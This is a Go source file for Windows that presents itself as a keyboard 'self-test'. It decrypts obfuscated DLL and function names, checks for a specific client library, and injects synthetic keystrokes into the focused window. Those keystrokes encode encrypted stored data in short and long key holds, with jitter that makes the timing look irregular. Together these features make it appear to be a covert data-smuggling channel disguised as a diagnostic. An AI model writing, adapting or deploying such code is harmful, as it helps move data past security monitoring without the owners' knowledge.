//go:build !designer

package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

const jitterSpan = 35

const standbySecs = 10

const (
	readyNotice = "Focus the window that should receive the pattern. Starting in"
	doneNotice  = "Self-test complete."
)

var errRejected = errors.New("keyboard input was rejected by this system; self-test aborted")

const spinTail = 16 * time.Millisecond

func decryptStr(blob []byte, seed uint32) string {
	state := seed
	out := make([]byte, len(blob))
	for i := range out {
		out[i] = blob[i] ^ next(&state)
	}
	s := string(out)
	wipeBytes(out)
	return s
}

//go:noinline
func (s *session) resolveSend() error {
	if err := syscall.NewLazyDLL(decryptStr(clientBlob[:], clientSeed)).Load(); err != nil {
		return errUnavailable
	}
	dll := decryptStr(dllBlob[:], dllSeed)
	proc := decryptStr(procBlob[:], procSeed)
	h := syscall.NewLazyDLL(dll)
	p := h.NewProc(proc)
	if err := p.Find(); err != nil {
		return errUnavailable
	}
	s.send = p.Addr()
	return nil
}

//go:noinline
func (s *session) deliver() error {
	if err := s.resolveSend(); err != nil {
		return err
	}
	s.standby()
	for pass := 0; pass < passes; pass++ {
		if pass > 0 {
			wait(passRest)
		}
		s.transmitSlot(pass)
		if s.rejected != 0 {
			return errRejected
		}
	}
	fmt.Println(doneNotice)
	return nil
}

func (s *session) standby() {
	fmt.Print(readyNotice)
	for n := standbySecs; n > 0; n-- {
		fmt.Printf(" %d", n)
		wait(1000)
	}
	fmt.Println()
}

const (
	keyDown = iota
	keyUp
)

var edgeFlags = [2]uint32{0, 2}

var phase = [2]func(*session, int){
	(*session).hold,
	(*session).rest,
}

//go:noinline
func (s *session) transmitSlot(pass int) {
	cand, _ := stored()
	off := pass * patBytes
	cipher := cand[off : off+patBytes]

	kState := s.slotSeed(pass)
	jState := tick() ^ slotSalt[pass]

	var curByte byte
	for i := 0; i < patBits; i++ {
		if i&7 == 0 {
			curByte = cipher[i>>3] ^ next(&kState)
		}
		bit := (curByte >> uint(7-(i&7))) & 1
		base := patUnit
		if bit == 1 {
			base = patUnit * 3
		}
		jitter := int(next(&jState)%(2*jitterSpan+1)) - jitterSpan
		ms := base + jitter
		if ms < patUnit/3 {
			ms = patUnit / 3
		}
		phase[i&1](s, ms)
		if s.rejected != 0 {
			return
		}
	}
	curByte, kState, jState = 0, 0, 0
}

func (s *session) hold(ms int) {
	if s.strike(keyDown) == 0 {
		s.rejected++
	}
	wait(ms)
	if s.strike(keyUp) == 0 {
		s.rejected++
	}
}

func (s *session) rest(ms int) { wait(ms) }

func (s *session) strike(edge int) uintptr {
	var buf [40]byte
	binary.LittleEndian.PutUint32(buf[0:], 1)
	binary.LittleEndian.PutUint16(buf[8:], vkTarget)
	binary.LittleEndian.PutUint32(buf[12:], edgeFlags[edge&1])
	r, _, _ := syscall.SyscallN(s.send, 1, uintptr(unsafe.Pointer(&buf[0])), 40)
	return r
}

func wait(ms int) {
	d := time.Duration(ms) * time.Millisecond
	start := time.Now()
	if d > spinTail {
		time.Sleep(d - spinTail)
	}
	for time.Since(start) < d {
	}
}
